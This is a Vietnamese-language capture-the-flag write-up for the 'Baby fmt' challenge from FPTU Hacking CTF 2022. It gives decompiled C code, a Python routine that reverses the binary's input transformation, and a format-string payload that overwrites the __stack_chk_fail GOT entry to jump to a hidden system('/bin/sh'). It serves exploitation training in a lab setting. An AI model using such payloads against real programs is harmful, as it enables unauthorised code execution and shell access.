# [Baby fmt - FPTU Hacking CTF 2022]
Code của em nó sau khi dịch ngược:
```C

void FUN_004015e4(void) {
    setvbuf(stdout, (char *)0x0, 2, 0);
    setvbuf(stdin, (char *)0x0, 2, 0);
    setvbuf(stderr, (char *)0x0, 2, 0);
    return;
}

void FUN_004012a8(char *param_1) {
    char cVar1;
    size_t sVar2;
    int local_10;

    sVar2 = strlen(param_1);
    for (local_10 = 0; local_10 < (int)sVar2; local_10 = local_10 + 1) {
        cVar1 = (char)local_10;
        if ((param_1[local_10] < 'a') || ('z' < param_1[local_10])) {
            if ((param_1[local_10] < '0') || ('9' < param_1[local_10])) {
                if ((param_1[local_10] < 'A') || ('Z' < param_1[local_10]))
                {
                    if ((param_1[local_10] == '%') && (param_1[local_10] == '$'))
                    {
                        param_1[local_10] = param_1[local_10] + cVar1 + (char)(local_10 / 7) * -7;
                    }
                }
                else
                {
                    param_1[local_10] = '\0';
                }
            }
            else if ((int)param_1[local_10] + local_10 % 7 < 0x3a) {
                param_1[local_10] = param_1[local_10] + cVar1 + (char)(local_10 / 7) * -7;
            }
            else {
                param_1[local_10] = cVar1 + (char)(local_10 / 7) * -7 + param_1[local_10] + -10;
            }
        }
        else if ((int)param_1[local_10] + local_10 % 7 < 0x7b) {
            param_1[local_10] = param_1[local_10] + cVar1 + (char)(local_10 / 7) * -7;
        }
        else {
            param_1[local_10] = cVar1 + (char)(local_10 / 7) * -7 + param_1[local_10] + -0x1a;
        }
    }
    return;
}

void FUN_00401216(void) {
    char *pcVar1;
    long in_FS_OFFSET;
    char local_78[104];
    long local_10;

    local_10 = *(long *)(in_FS_OFFSET + 0x28);
    puts("Tell me some funny things!");
    fgets(local_78, 0x78, stdin);
    pcVar1 = strstr(local_78, "funny");
    if (pcVar1 != (char *)0x0) {
        FUN_004012a8(local_78);
        printf(local_78);
    }
    if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
        __stack_chk_fail();
    }
    return;
}

undefined8 FUN_00401649(void) {
    FUN_004015e4();
    FUN_00401216();
    return 0;
}
```

Nhìn thì biết là format string bình thường, cơ mà payload được đưa qua một hàm làm biến đổi nó thành cái gì đó khác. Tức là phải viết được một cái hàm có chức năng ngược lại cái hàm kia bằng python. Nó khiến mình đau khổ vì đang ốm mà cứ bị bắt lập trình mấy cái lằng nhằng. Đây là đoạn code làm ngược của mình:
```python
def case1(temp, local_10):
    # import pdb; pdb.set_trace()
    if ((temp < ord('a')) or (ord('z') < temp)):
        if ((temp < ord('0')) or (ord('9') < temp)):
            if ((temp < ord('A')) or (ord('Z') < temp)):
                if ((temp == ord('%')) and (temp == ord('$'))):
                    return True
            else:
                return False
        elif (temp + (local_10 % 7) < 0x3a):
            return True
        else:
            return False
    elif (temp + (local_10 % 7) < 0x7b):
        return True
    else:
        return False

def case2(temp, local_10):
    if ((temp < ord('a')) or (ord('z') < temp)):
        if ((temp < ord('0')) or (ord('9') < temp)):
            if ((temp < ord('A')) or (ord('Z') < temp)):
                if ((temp == ord('%')) and (temp == ord('$'))):
                    return False
            else:
                return False
        elif (temp + (local_10 % 7) < 0x3a):
            return False
        else:
            return True
    elif (temp + (local_10 % 7) < 0x7b):
        return False
    else:
        return False

def case3(temp, local_10):
    if ((temp < ord('a')) or (ord('z') < temp)):
        if ((temp < ord('0')) or (ord('9') < temp)):
            if ((temp < ord('A')) or (ord('Z') < temp)):
                if ((temp == ord('%')) and (temp == ord('$'))):
                    return False
            else:
                return False
        elif (temp + (local_10 % 7) < 0x3a):
            return False
        else:
            return False
    elif (temp + (local_10 % 7) < 0x7b):
        return False
    else:
        return True

def case4(temp, local_10):
    if ((temp < ord('a')) or (ord('z') < temp)):
        if ((temp < ord('0')) or (ord('9') < temp)):
            if ((temp < ord('A')) or (ord('Z') < temp)):
                if ((temp == ord('%')) and (temp == ord('$'))):
                    return False
            else:
                return True
        elif (temp + (local_10 % 7) < 0x3a):
            return False
        else:
            return False
    elif (temp + (local_10 % 7) < 0x7b):
        return False
    else:
        return False

def FUN_004012a8(param_1):
    # param_1 = [ord(i) for i in param_1]
    param_1 = b'fvpqc' + param_1
    result = []
    for local_10 in range(len(param_1)):
        cVar1 = local_10 & 0xff
        temp = (param_1[local_10] - (cVar1 + ((local_10 // 7) * -7))) & 0xff
        if case1(temp, local_10):
            result.append(temp)
            continue

        temp = (param_1[local_10] - (cVar1 + ((local_10 // 7) * -7) - 10)) & 0xff
        if case2(temp, local_10):
            result.append(temp)
            continue

        temp = (param_1[local_10] - (cVar1 + ((local_10 // 7) * -7) - 0x1a)) & 0xff
        if case3(temp, local_10):
            result.append(temp)
            continue

        temp = 0
        if case4(temp, local_10):
            result.append(temp)
            continue

        result.append(param_1[local_10])

    return b'funny'+b''.join([i.to_bytes(1, 'little') for i in result])[5:]
```
Ok xong rồi mình đi theo hướng exploit format string như viết ROP lên stack, nhưng trong quá trình làm phát hiện ra có hàm `system` trong GOT. Linh tính mách bảo mình `strings` nó thứ xem thì tìm thấy luôn cả `/bin/sh` trong binary. Lục tìm trong Ghidra thì đúng là có hàm `system("/bin/sh")` thật. Tại vì symbols bị strip hết nên mình cũng không biết, làm phí mất 30 phút mình đi theo hướng ROP.

Dùng format string để ghi đè `__stack_chk_fail@got` thành hàm mục tiêu, đoạn payload đó dài 0x6f để nó ghi đè Canary luôn
```python
payload = (f'%{0x15cd-5}c%10$hn'.encode().ljust(0x20-5, b'\0') + \
        p64(bin.got['__stack_chk_fail'])).ljust(0x6f-5, b'\0')
```
Tại sao lại phải trừ 5, vì để chừa chỗ cho chữ *funny* ở đầu.
